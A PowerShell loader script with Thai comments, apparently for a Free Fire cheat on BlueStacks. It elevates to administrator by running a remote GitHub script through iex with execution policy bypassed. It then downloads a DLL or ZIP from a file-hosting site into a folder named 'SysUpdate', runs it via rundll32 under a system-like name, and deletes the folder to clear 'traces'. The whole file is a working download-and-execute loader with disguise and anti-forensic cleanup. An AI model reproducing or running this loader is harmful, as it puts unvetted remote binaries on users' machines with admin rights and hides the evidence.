# 1. ขอสิทธิ์ Admin
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $adminCmd = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex (Invoke-RestMethod 'https://raw.githubusercontent.com/potae112/Cmdfreefire/main/dugduy.ps1')"
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"$adminCmd`"" -Verb RunAs
    exit
}

# 2. ตั้งค่า
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$url = "https://files.catbox.moe/0ukxya.dll"
$workDir = "$env:LOCALAPPDATA\Temp\SysUpdate"
$downloadPath = Join-Path $workDir "downloaded_file" # โหลดมาพักไว้ก่อน
$blueStacksPath = "C:\Program Files\BlueStacks_nxt\HD-Player.exe"

if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue }
New-Item -ItemType Directory -Path $workDir -Force | Out-Null

# 3. ดาวน์โหลด
Write-Host "[*] Downloading Component..." -ForegroundColor Cyan
try {
    Invoke-WebRequest -Uri $url -OutFile $downloadPath -UseBasicParsing -ErrorAction Stop
} catch {
    Write-Host "[!] Download failed." -ForegroundColor Red; Pause; exit
}

# 4. ตรวจสอบว่าเป็น Zip หรือ DLL (หัวใจสำคัญที่แก้ Error)
$fileMagic = -join ((Get-Content $downloadPath -Encoding Byte -TotalCount 2) | ForEach-Object { "{0:X2}" -f $_ })

if ($fileMagic -eq "504B") { # 504B คือรหัสขึ้นต้นของไฟล์ ZIP (PK)
    Write-Host "[*] Extracting Zip Package..." -ForegroundColor Cyan
    try {
        Expand-Archive -Path $downloadPath -DestinationPath $workDir -Force
        Remove-Item $downloadPath
    } catch { 
        Write-Host "[!] Extraction failed." -ForegroundColor Yellow 
    }
} else {
    Write-Host "[*] File is a direct DLL. Moving to work directory..." -ForegroundColor Cyan
    Move-Item $downloadPath (Join-Path $workDir "SystemData.dll") -Force
}

# 5. รันระบบ (เช็คทั้ง EXE และ DLL)
$exe = Get-ChildItem -Path $workDir -Filter "*.exe" -Recurse | Select-Object -First 1
$dll = Get-ChildItem -Path $workDir -Filter "*.dll" -Recurse | Select-Object -First 1

if ($exe) {
    Write-Host "[+] Launching: $($exe.Name)" -ForegroundColor Green
    Start-Process -FilePath $exe.FullName -WorkingDirectory $exe.DirectoryName -Wait
} elseif ($dll) {
    Write-Host "[+] Launching via DLL Proxy..." -ForegroundColor Green
    # รัน DLL ผ่าน rundll32
    Start-Process -FilePath "rundll32.exe" -ArgumentList "`"$($dll.FullName)`",Control_RunDLL `"$blueStacksPath`"" -Wait
} else {
    Write-Host "[!] Error: No executable or DLL found." -ForegroundColor Red
}

# 6. Cleanup
Write-Host "[*] Cleaning up traces..." -ForegroundColor Gray
Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
Write-Host "[+] Done." -ForegroundColor Green